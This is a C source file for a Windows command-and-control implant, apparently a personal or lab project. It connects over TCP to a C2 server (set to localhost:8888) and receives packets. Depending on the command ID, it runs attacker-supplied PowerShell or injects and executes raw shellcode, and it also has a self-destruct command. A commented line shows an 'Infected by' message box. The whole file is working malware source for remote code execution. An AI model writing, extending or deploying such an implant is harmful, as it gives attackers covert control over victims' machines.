#include "helper.h" //has all the includes

#include "Attacks/ExecutePowershell.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")


/*
	gcc .\implant.c .\helper.c .\Attacks\ExecutePowershell.c -o .\implant.exe -lwininet -lws2_32
*/

LPCSTR host = "127.0.0.1"; 
const USHORT port = 8888;

BOOL receiveC2Packet(PC2_PACKET receivedPacket){
    WSADATA wsaData;
    SOCKET  c2Socket = INVALID_SOCKET;
    struct sockaddr_in c2Address = { 0 };

    int    recvResult = 0;
    SIZE_T totalBytesReceived = 0;
    BYTE*  packetCursor = (BYTE*)receivedPacket;

    printf("[C2] C2 implant by 0xRzdhop activated !\n");
    WSAStartup(MAKEWORD(2, 2), &wsaData); //initialisation de la DLL Winsock par le process

    printf("[C2] Creating TCP/IP socket\n");
    c2Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    c2Address.sin_family = AF_INET;
    c2Address.sin_port = htons(port);
    inet_pton(AF_INET, host, &c2Address.sin_addr);


    printf("[C2] Connecting to C2 (%s:%d)\n", host, port);
    connect(c2Socket, (struct sockaddr*)&c2Address, sizeof(c2Address));

    printf("[C2] Connected ! Waiting for C2_PACKET (%llu bytes)\n", (unsigned long long)sizeof(C2_PACKET));
    while (totalBytesReceived < sizeof(C2_PACKET)) {

        recvResult = recv(c2Socket,
            (char*)(packetCursor + totalBytesReceived),
            (int)(sizeof(C2_PACKET) - totalBytesReceived),
            0
        );

        if (recvResult <= 0) printf("[C2][ERR] recv() failed or connection closed (%d)\n", WSAGetLastError());
        
        totalBytesReceived += recvResult;
    }
    
    printf("[C2] Packet fully received\n");
    printf("[C2] Command ID : %lu\n", receivedPacket->CmdId);
}

int main() {
    //ExecPowerShell(L"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')");

    PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
    BOOL loop = 1;
    while(loop) {
        receiveC2Packet(pkt);
        switch(pkt->CmdId) {
            case 0x1:
                printf("[C2] Received command ID 1 for {executePowershell}\n");
                ExecPowerShell(ConvertDataToLPCWSTR(pkt->Data));
                break;
            case 0x2:
                printf("[C2] Received command ID 2 for {executeShellCode}\n");
                ExecShellcode(pkt->Data);
                break;
            case 0x10 :
                printf("[C2] Starting self-destruct !");
                loop = 0;
                break;
            default :
                printf("[-] Undefined command received, ignored...\n");
                printf("[DEBUG] Hexdump :\n");
                hexdump((BYTE*)pkt, sizeof(C2_PACKET));
                printf("[END DEBUG]\n");
                loop = 0;
                break;
    }
    }
    receiveC2Packet(pkt);

    return 0;
}